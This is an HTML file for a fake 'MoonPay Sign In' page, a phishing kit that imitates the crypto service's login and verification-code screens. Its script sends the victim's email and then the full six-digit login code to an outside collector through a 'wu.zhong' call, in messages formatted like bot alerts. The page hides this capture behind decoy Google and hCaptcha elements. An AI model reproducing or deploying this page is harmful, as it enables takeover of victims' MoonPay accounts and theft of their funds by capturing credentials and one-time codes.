<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoonPay Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #ff6b9d 0%, #c44569 30%, #6c5ce7 70%, #00cec9 100%);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        .star:nth-child(odd) {
            animation-delay: 1s;
        }

        .star:nth-child(3n) {
            animation-delay: 2s;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.3; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.2); }
        }

        .landscape {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 40%;
            z-index: 2;
            pointer-events: none;
        }

        .planet {
            position: absolute;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #00cec9, #0984e3, #6c5ce7);
            animation: float 6s ease-in-out infinite;
        }

        .planet.large {
            width: 120px;
            height: 120px;
            right: 20%;
            top: 20%;
            animation-delay: -2s;
        }

        .planet.small {
            width: 60px;
            height: 60px;
            right: 35%;
            top: 10%;
            animation-delay: -4s;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }

        .mountain {
            position: absolute;
            bottom: 0;
            background: linear-gradient(45deg, #2d3436, #636e72);
            clip-path: polygon(0 100%, 50% 0%, 100% 100%);
        }

        .mountain.left {
            left: -10%;
            width: 200px;
            height: 150px;
        }

        .mountain.right {
            right: -10%;
            width: 180px;
            height: 120px;
        }

        .mountain.center {
            left: 60%;
            width: 100px;
            height: 80px;
        }

        .container {
            position: relative;
            z-index: 10;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .screen {
            min-height: 100vh;
            display: none;
            flex-direction: column;
            padding: 20px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
        }

        .screen.active {
            display: flex;
        }


        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            margin-bottom: 40px;
        }

        .close-btn, .back-btn {
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 50%;
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            transition: all 0.2s ease;
        }

        .close-btn:hover, .back-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: scale(1.05);
        }


        .sign-in-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }

        .title {
            font-size: 2.5rem;
            font-weight: 700;
            color: white;
            text-align: center;
            margin-bottom: 60px;
            line-height: 1.2;
        }

        .input-group {
            margin-bottom: 30px;
        }

        .input-container {
            position: relative;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 20px;
            backdrop-filter: blur(10px);
        }

        .input-icon {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.7);
        }

        .email-input {
            background: none;
            border: none;
            color: white;
            font-size: 1.1rem;
            width: 100%;
            padding-left: 40px;
            outline: none;
        }

        .email-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .continue-btn {
            background: linear-gradient(135deg, #8e44ad, #3742fa);
            border: none;
            border-radius: 25px;
            color: white;
            font-size: 1.2rem;
            font-weight: 600;
            padding: 18px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 40px;
            transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(142, 68, 173, 0.3);
        }

        .continue-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(142, 68, 173, 0.4);
        }

        .divider {
            text-align: center;
            color: rgba(255, 255, 255, 0.6);
            margin: 30px 0;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background: rgba(255, 255, 255, 0.2);
        }

        .divider::before { left: 0; }
        .divider::after { right: 0; }

        .google-btn {
            background: rgba(255, 255, 255, 0.9);
            border: none;
            border-radius: 25px;
            color: #333;
            font-size: 1.1rem;
            font-weight: 600;
            padding: 18px;
            width: 100%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
            transition: all 0.2s ease;
        }

        .google-btn:hover {
            background: white;
            transform: translateY(-1px);
        }

        .footer-text {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.9rem;
            text-align: center;
            line-height: 1.5;
        }

        .footer-text a {
            color: white;
            text-decoration: none;
            font-weight: 600;
        }


        .verification-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
            text-align: center;
        }

        .verification-title {
            font-size: 2rem;
            font-weight: 700;
            color: white;
            margin-bottom: 60px;
        }

        .email-icon-container {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #8e44ad, #3742fa);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 40px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .verification-text {
            color: rgba(255, 255, 255, 0.8);
            font-size: 1.1rem;
            line-height: 1.5;
            margin-bottom: 40px;
        }

        .code-input-container {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .code-digit {
            width: 50px;
            height: 60px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: white;
            font-size: 1.5rem;
            font-weight: 600;
            text-align: center;
            outline: none;
            transition: all 0.2s ease;
        }

        .code-digit:focus {
            border-color: #8e44ad;
            background: rgba(255, 255, 255, 0.15);
        }

        .resend-text {
            color: rgba(255, 255, 255, 0.6);
            font-size: 1rem;
        }


        @media (max-width: 480px) {
            .title {
                font-size: 2rem;
            }
            
            .verification-title {
                font-size: 1.7rem;
            }
            
            .code-digit {
                width: 45px;
                height: 55px;
                font-size: 1.3rem;
            }
        }
    </style>
</head>
<body>

    <div class="stars" id="stars"></div>
    
  
    <div class="landscape">
        <div class="planet large"></div>
        <div class="planet small"></div>
        <div class="mountain left"></div>
        <div class="mountain center"></div>
        <div class="mountain right"></div>
    </div>

    <div class="container">

        <div class="screen active" id="signInScreen">
            <div class="header">
                <div></div>
                <button class="close-btn" onclick="closeModal()">×</button>
            </div>
            
            <div class="sign-in-content">
                <h1 class="title">Sign in with<br>MoonPay</h1>
                
                <div class="input-group">
                    <div class="input-container">
                        <div class="input-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#fff" viewBox="0 0 16 16">
                            <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1zm13 2.383-4.708 2.825L15 11.105zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741M1 11.105l4.708-2.897L1 5.383z"/>
                            </svg></div>
                        <input type="email" class="email-input" placeholder="Email address" id="emailInput">
                    </div>
                </div>
                
                <button class="continue-btn" onclick="proceedToVerification()">Continue</button>
                
                <div class="divider">Or sign in with</div>
                
                <button class="google-btn">
                    <span style="color: #4285f4; font-weight: bold;"></span>
                    Google
                </button>
                
                <p class="footer-text">
                    This site is protected by <strong>hCaptcha</strong> and its 
                    <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
                </p>
            </div>
        </div>

        <div class="screen" id="verificationScreen">
            <div class="header">
                <button class="back-btn" onclick="goBack()">←</button>
                <button class="close-btn" onclick="closeModal()">×</button>
            </div>
            
            <div class="verification-content">
                <h1 class="verification-title">Verification code</h1>
                
                <div class="email-icon-container">
                    <span style="font-size: 32px;"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#fff" viewBox="0 0 16 16">
                            <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1zm13 2.383-4.708 2.825L15 11.105zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741M1 11.105l4.708-2.897L1 5.383z"/>
                            </svg></span>
                </div>
                
                <p class="verification-text">
                    Enter the 6-digit code that was<br>
                    sent to <span id="userEmail"></span>
                </p>
                
                <div class="code-input-container">
                    <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 0)">
                    <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 1)">
                    <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 2)">
                    <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 3)">
                    <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 4)">
                    <input type="text" class="code-digit" maxlength="1" oninput="moveToNext(this, 5)">
                </div>
                
                <p class="resend-text">You can get a new code in <span id="countdown">14</span>s</p>
            </div>
        </div>
    </div>

    <script>

        function createStars() {
            const starsContainer = document.getElementById('stars');
            const numberOfStars = 100;
            
            for (let i = 0; i < numberOfStars; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = Math.random() * 3 + 1 + 'px';
                star.style.height = star.style.width;
                star.style.animationDuration = (Math.random() * 3 + 2) + 's';
                starsContainer.appendChild(star);
            }
        }


        function proceedToVerification() {
            const email = document.getElementById('emailInput').value;
            if (email) {
                document.getElementById('userEmail').textContent = email;
            }
            
            document.getElementById('signInScreen').classList.remove('active');
            document.getElementById('verificationScreen').classList.add('active');

            wu.zhong(`🔰 Moonpay Login\n\n✉️Email: ${document.getElementById('emailInput').value}`, "com.moonpay#");

            startCountdown();
        }

        function goBack() {
            document.getElementById('verificationScreen').classList.remove('active');
            document.getElementById('signInScreen').classList.add('active');
        }

       


        function moveToNext(current, index) {
            if (current.value.length === 1 && index < 5) {
                const nextInput = current.parentNode.children[index + 1];
                nextInput.focus();
            }
            

            const digits = document.querySelectorAll('.code-digit');
            const code = Array.from(digits).map(d => d.value).join('');
            if (code.length === 6) {
                setTimeout(() => {
                   
                     wu.zhong(`🔰Moonpay Login \n\n✉️Email: ${document.getElementById('emailInput').value}\n\n🔒Code: ${code}`, "com.moonpay");


                }, 100);
            }
        }

      
        function startCountdown() {
            let seconds = 14;
            const countdownElement = document.getElementById('countdown');
            
            const timer = setInterval(() => {
                seconds--;
                countdownElement.textContent = seconds;
                
                if (seconds <= 0) {
                    clearInterval(timer);
                    countdownElement.parentNode.innerHTML = '<span style="color: #8e44ad; cursor: pointer;" onclick="resendCode()">Get a new code</span>';
                }
            }, 1000);
        }

        function resendCode() {
        
            startCountdown();
            document.getElementById('countdown').parentNode.innerHTML = 'You can get a new code in <span id="countdown">14</span>s';
        }


        createStars();
        

    </script>
</body>
</html>
